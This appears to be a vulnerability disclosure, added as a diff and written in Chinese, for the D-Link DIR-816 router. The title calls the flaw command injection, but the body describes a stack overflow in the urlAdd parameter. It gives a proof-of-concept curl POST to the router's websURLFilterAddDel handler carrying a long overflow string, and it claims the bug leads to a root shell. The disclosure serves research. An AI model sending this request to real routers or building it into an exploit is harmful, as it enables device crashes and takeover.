@@ -1,0 +1,41 @@
+# dlink dir 816路由器 存在命令注入漏洞
+
+## 写在前面
+
+• 厂商信息：https://www.dlink.com/
+
+• 固件下载地址：http://tsd.dlink.com.tw/GPL.asp
+
+## 1.影响版本
+
+![img](img/wps1.jpg) 
+
+ 
+
+图1为固件版本信息
+
+## 2.漏洞细节
+
+![image-20220919212247571](img/image-20220919212247571.png)
+
+程序通过 urladd 参数获得的内容传递给 V2，然后将 V2 分配给 V9 最后，通过 strcat 函数，将 V9 添加到 v10 的堆栈中。没有大小检查，因此存在堆栈溢出漏洞。
+
+## POC
+
+为了重现该漏洞，可遵循以下步骤
+
+使用fat 仿真固件DIR-816_A2_v1.10CNB04.img
+
+使用以下poc进行攻击
+
+```
+curl -i -X POST http://192.168.0.1/goform/websURLFilterAddDel -d tokenid=xxxx -d 'urlAdd=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaao'
+```
+
+![image-20220919212409013](img/image-20220919212409013.png)
+
+图2 POC攻击效果
+
+最后，您可以编写exp，这可以实现获得根shell的非常稳定的效果
+
+![image-20220919212454460](img/image-20220919212454460.png)
